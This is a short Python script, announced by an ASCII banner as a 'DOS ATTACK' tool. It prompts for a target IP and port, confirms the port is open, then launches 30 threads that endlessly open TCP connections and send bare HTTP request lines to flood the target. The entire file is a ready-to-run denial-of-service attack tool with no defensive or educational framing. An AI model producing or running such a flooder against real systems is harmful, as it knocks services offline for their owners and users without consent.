import socket, threading, time, pyfiglet

print(pyfiglet.figlet_format("DOS ATTACK"))


target = input("TARGET IP: ")
port = int(input("ENTER THE PORT: "))
source = '182.21.20.32'

def dos():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
        sock.connect_ex((target, port))
        sock.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        sock.sendto(("Host: " + source + "\r\n\r\n").encode('ascii'), (target, port))
        
        sock.close()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
if sock.connect_ex((target, port)):
    print("Port", port, "is closed")
    exit()

else:
    print("Port", port, "is open")

for i in range(30):
    thread = threading.Thread(target=dos)
    thread.start()
